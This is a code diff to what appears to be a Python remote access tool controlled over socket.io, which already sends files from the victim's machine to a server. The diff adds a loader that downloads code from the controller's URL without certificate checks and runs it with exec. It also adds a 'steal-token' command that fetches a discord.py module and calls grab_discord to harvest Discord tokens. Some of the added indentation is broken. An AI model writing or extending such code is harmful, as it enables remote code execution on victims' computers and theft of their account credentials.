@@ -6,6 +6,21 @@ import sys
 import base64
 
 def run(data):
+    def create_moduel(url):
+        # Create an SSL context that doesn't verify certificates
+        context = ssl._create_unverified_context()
+        # Use the context when opening the URL
+        with urlopen(url, context=context) as response:
+        code = response.read().decode('utf-8')
+    
+        spec = importlib.util.spec_from_loader('temp', loader=None)
+        module = importlib.util.module_from_spec(spec)
+    
+        # Execute the code in the module's namespace
+        exec(code, module.__dict__)
+    
+        return module
+
     sio = socketio.Client(logger=False, engineio_logger=False)
 
     system = platform.system()
@@ -91,6 +106,14 @@ def run(data):
             print(file)
             file_ready = base64.b64encode(file)
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
+
+    @sio.on("steal-token")
+    def steal_token(new_data):
+        if new_data['uuid'] == data['uuid']:
+            module = create_moduel(data['url']+'discord.py')
+            result = module.grab_discord()
+            print(result)
+
 
 
     sio.connect(data['url'])
